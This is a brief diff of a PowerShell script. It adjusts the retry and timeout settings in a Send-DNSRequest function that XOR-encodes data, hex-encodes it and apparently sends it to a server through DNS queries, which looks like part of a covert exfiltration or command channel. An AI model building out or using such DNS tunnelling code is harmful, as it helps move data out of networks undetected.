@@ -58,7 +58,7 @@ function Compress-Encode
 function Send-DNSRequest {
     param ([string] $server, [string] $data, [string] $jobid)
     $data = Xor $data
-	$opti = '-retry=0 -timeout=0.1'
+	$opti = '-retry=1 -timeout=0'
 	$data = Convert-ToCHexString $data
     $length = $data.Length;
     $key = 't.c'
